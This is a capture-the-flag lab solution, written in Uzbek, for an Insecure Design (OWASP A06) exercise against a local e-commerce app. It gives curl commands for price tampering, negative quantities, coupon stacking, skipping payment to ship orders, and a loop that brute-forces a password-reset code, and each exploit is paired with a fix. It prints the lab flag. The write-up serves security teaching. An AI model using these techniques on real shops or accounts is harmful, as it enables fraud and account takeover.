🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A06 — Yechim tahlili (spoylerlar)

Barcha misollar `curl` orqali. `COOKIE` oʻrniga `/login` dan keyin olingan sessiya cookie'sini qoʻying (`curl -c cookies.txt ...` / `-b cookies.txt`).

## 0. Login

```bash
curl -s -c cookies.txt -X POST http://127.0.0.1:8051/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}'
```

## 1-nuqson — narx mijozdan keladi

`create_order()` narxni quyidagicha oladi:
```python
price = it.get("price", product["price"])
```
Server soʻrovda narx boʻlsa, yuborilgan narxga ishonadi.

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":3,"quantity":1,"price":1}]}'
# total: 500000 oʻrniga 1
```

**Dizayn qoidasi:** narx — faqat server biladigan biznes-fakt. Mijoz `product_id` va `quantity` yuborishi mumkin, ammo pulga bevosita taʼsir qiladigan qiymatni hech qachon yubormasligi kerak.

**Fix:** `price = product["price"]` — soʻrovdagi `price` maydoni shunchaki eʼtiborga olinmaydi (`fixed/app.py`, `# FIX 1`).

## 2-nuqson — cheklanmagan/manfiy miqdor

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":2,"quantity":-10}]}'
# total: -1500000 → toʻlovda alice balansi kamaymaydi, aksincha oshadi
```

**Qoida:** mijozdan kelgan va pul hisob-kitobida ishtirok etadigan har qanday sonli maydon faqat «mavjudmi» deb tekshirilmasdan, ruxsat etilgan oraliq bilan cheklanishi kerak (bu yerda 1–10).

**Fix:** `1 <= qty <= MAX_QTY`, aks holda 400 (`# FIX 2`).

## 3-nuqson — cheklovsiz kupon

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":2,"quantity":1}],"coupons":["WELCOME50","WELCOME50","WELCOME50"]}'
# chegirma uch marta qoʻshiladi
```

**Qoida:** «bitta kupon = bitta chegirma, har bir foydalanuvchiga bir marta» degan biznes-qoida hisoblash usulidan «oʻz-oʻzidan» kelib chiqmasligi, balki aniq kodlanishi kerak.

**Fix:** buyurtmada bittadan ortiq kupon boʻlmaydi, kupon foydalanuvchi tomonidan ishlatilmagan boʻlishi shart; ishlatilganlik fakti buyurtma yaratilganda emas, toʻlov paytida qayd etiladi (`# FIX 3` va `/pay` ichida takroriy tekshiruv).

## 4/5-nuqson — bosqichlar tartibini aylanib oʻtish (yaratish → toʻlov → yuborish)

```bash
OID=$(curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":3,"quantity":1}]}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')

curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders/$OID/ship
# {"flag": "FLAG{A06_gift_delivered_without_paying_properly}", "status": "shipped"} — toʻlovsiz!
```

Shuningdek, buyurtmani qayta toʻlash mumkin (`/pay` `status` ni tekshirmaydi), 2-nuqson (manfiy summa) bilan birga bu har bir takroriy chaqiruvda hujumchi balansini yana oshiradi.

**Qoida:** koʻp bosqichli jarayon (created → paid → shipped) bu chekli avtomat. Har bir oʻtish **joriy holatni** tekshirishi shart, mijoz endpointlarni «toʻgʻri tartibda» chaqiradi deb umid qilmaslik kerak. Chaqiruvlar tartibini mijoz belgilaydi, unga ishonib boʻlmaydi.

**Fix:** `/pay` uchun `status == "created"`, `/ship` uchun `status == "paid"` talab qilinadi (`# FIX 4`, `# FIX 5`).

## 6/7-nuqson — parolni tiklash kodini saralash

`docker compose logs vulnerable` da urinishlar cheklanmagan 4 xonali kod koʻrinadi (`random.randint(0, 9999)`):

```bash
for i in $(seq -w 0 9999); do
  r=$(curl -s -X POST http://127.0.0.1:8051/password-reset/confirm \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"bob\",\"otp\":\"$i\",\"new_password\":\"hacked123\"}")
  echo "$r" | grep -q '"ok": true' && echo "FOUND: $i" && break
done
```
10 000 ta variant bir necha soniyada saralab chiqiladi: server urinishlar sonini cheklamaydi va kriptografik bardoshli generatordan foydalanmaydi.

**Qoida:** bir martalik kod — qisqa umrli va tanlash urinishlari soni cheklangan sir. Faqat uzunlik va tasodifiylik manbai (`random`, kriptografik emas) yetarli emas: «raqam uzunroq boʻlsin» emas, jarayon darajasida saralashdan himoya kerak.

**Fix** (`fixed/app.py`):
- `random.randint()` oʻrniga `secrets.randbelow()`, kod 6 xonali;
- `OTP_MAX_ATTEMPTS = 5` — 5 ta notoʻgʻri urinishdan keyin kod yoʻq qilinadi;
- `OTP_TTL = 300` soniya — kod vaqt boʻyicha eskiradi;
- `OTP_COOLDOWN = 60` soniya — urinishlar hisoblagichini nollash uchun kodni zudlik bilan qayta chiqarib boʻlmaydi;
- kodni `hmac.compare_digest` bilan solishtirish (timing-hujumlarga bardoshli);
- `/password-reset/request` foydalanuvchi mavjud yoki mavjud emasligidan qatʼi nazar bir xil javob beradi (akkauntlarni sanab chiqishga yoʻl qoʻymaydi).

## Xulosa: bu laboratoriyada aynan Insecure Design ga nima tegishli

Yettita nuqsonning birortasi ham ekranlash, filtr yoki bitta huquq tekshiruvi qoʻshish bilan tuzatilmaydi. Hamma joyda **loyihalash bosqichida** quyidagilarni hal qilish kerak edi: narxning haqiqat manbai kim; qanday oraliqlar ruxsat etiladi; chegirmani necha marta qoʻllash mumkin; holatning qaysi oʻtishlari ruxsat etiladi; bir martalik sirni saralashdan qanday himoyalash. Aynan shu A06 ning mohiyati: zaiflik kod satrida emas, yoʻq qoida ichida yashaydi.
